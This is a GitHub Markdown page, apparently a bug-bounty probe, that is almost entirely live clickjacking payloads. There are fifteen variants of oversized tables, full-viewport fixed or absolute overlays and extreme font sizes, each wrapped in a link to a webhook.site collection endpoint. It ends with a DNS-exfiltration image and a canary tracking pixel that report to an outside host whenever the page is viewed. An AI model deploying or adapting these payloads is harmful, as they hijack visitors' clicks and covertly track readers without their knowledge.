# Security Research - v34

## GitHub Markdown HTML Attribute Testing

Testing various HTML elements and attributes for potential UI/clickjacking vulnerabilities.

---

### 1) Table Border Size Variations

Testing if table border validation has been fixed:

<a href="https://webhook.site/a13fd38a-8fdd-46d9-a8cd-c1f5f3285027/clicked-table-1">
<table border="999999">
<tr><td>Click test 1</td></tr>
</table>
</a>

<a href="https://webhook.site/a13fd38a-8fdd-46d9-a8cd-c1f5f3285027/clicked-table-2">
<table border="9999999999">
<tr><td>Click test 2</td></tr>
</table>
</a>

---

### 2) KBD with Extreme Sizes

<a href="https://webhook.site/a13fd38a-8fdd-46d9-a8cd-c1f5f3285027/kbd-click">
<kbd>
<table border="1000000" align="center"></table>
</kbd>
</a>

---

### 3) Ruby Annotation Overflow

<a href="https://webhook.site/a13fd38a-8fdd-46d9-a8cd-c1f5f3285027/ruby-click">
<ruby>Normal Text<rt style="font-size:9999px">HUGE ANNOTATION</rt></ruby>
</a>

<ruby>Version 2.0<rt>                                                                                                                   Hidden content padding test</rt></ruby>

---

### 4) Mark Element with Large Font

<a href="https://webhook.site/a13fd38a-8fdd-46d9-a8cd-c1f5f3285027/mark-click">
<mark style="font-size:9999px;position:absolute">HUGE MARK</mark>
</a>

---

### 5) Details/Summary Click Capture

<details>
<summary>Click to expand</summary>
<a href="https://webhook.site/a13fd38a-8fdd-46d9-a8cd-c1f5f3285027/details-click">
Hidden link inside details
</a>
</details>

---

### 6) Nested Divs with Align

<div align="center">
<div align="left">
<div align="right">
<a href="https://webhook.site/a13fd38a-8fdd-46d9-a8cd-c1f5f3285027/nested-div-click">
<table border="50000" cellpadding="99999" cellspacing="99999">
<tr><td>Nested test</td></tr>
</table>
</a>
</div>
</div>
</div>

---

### 7) Image Width Percentage Abuse

<a href="https://webhook.site/a13fd38a-8fdd-46d9-a8cd-c1f5f3285027/img-click">
<img src="https://webhook.site/a13fd38a-8fdd-46d9-a8cd-c1f5f3285027/img-load.gif" width="9999%" height="9999%">
</a>

---

### 8) SUP/SUB with Position

<a href="https://webhook.site/a13fd38a-8fdd-46d9-a8cd-c1f5f3285027/sup-click">
<sup style="position:fixed;top:0;left:0;width:100%;height:100%;z-index:9999">Overlay</sup>
</a>

---

### 9) HR with Width Abuse

<a href="https://webhook.site/a13fd38a-8fdd-46d9-a8cd-c1f5f3285027/hr-click">
<hr width="999999" size="999999">
</a>

---

### 10) Definition List Overflow

<a href="https://webhook.site/a13fd38a-8fdd-46d9-a8cd-c1f5f3285027/dl-click">
<dl>
<dt style="width:9999px;height:9999px">Term</dt>
<dd>Definition with massive term above</dd>
</dl>
</a>

---

### 11) Pre with Massive Content

<a href="https://webhook.site/a13fd38a-8fdd-46d9-a8cd-c1f5f3285027/pre-click">
<pre style="width:9999px;white-space:nowrap">
This is very long content that might overflow the container and create clickable areas outside normal bounds...............................................................................................................................
</pre>
</a>

---

### 12) Samp Element Test

<a href="https://webhook.site/a13fd38a-8fdd-46d9-a8cd-c1f5f3285027/samp-click">
<samp style="display:block;width:9999px;height:9999px">Sample output with huge dimensions</samp>
</a>

---

### 13) INS (Inserted) Element

<a href="https://webhook.site/a13fd38a-8fdd-46d9-a8cd-c1f5f3285027/ins-click">
<ins style="display:block;position:absolute;width:100vw;height:100vh">Inserted content overlay</ins>
</a>

---

### 14) Table Cellpadding/Cellspacing Abuse

<a href="https://webhook.site/a13fd38a-8fdd-46d9-a8cd-c1f5f3285027/cellpad-click">
<table cellpadding="99999999" cellspacing="99999999">
<tr><td>Content</td></tr>
</table>
</a>

---

### 15) Combined KBD + Table Attack

<a href="https://webhook.site/a13fd38a-8fdd-46d9-a8cd-c1f5f3285027/combo-click">
<kbd>
<table border="17111111" align="right"></table>
</kbd>
<kbd>
<table border="17111111" align="left"></table>
</kbd>
<kbd>
<table border="17111111" align="center"></table>
</kbd>
</a>

---

### DNS Exfil

![dns](https://v34-dns.a13fd38a-8fdd-46d9-a8cd-c1f5f3285027.dnshook.site/dns.gif)

### Canary

![canary](https://webhook.site/a13fd38a-8fdd-46d9-a8cd-c1f5f3285027/v34-canary.gif)

---

*v34 - GitHub Markdown HTML attribute testing*
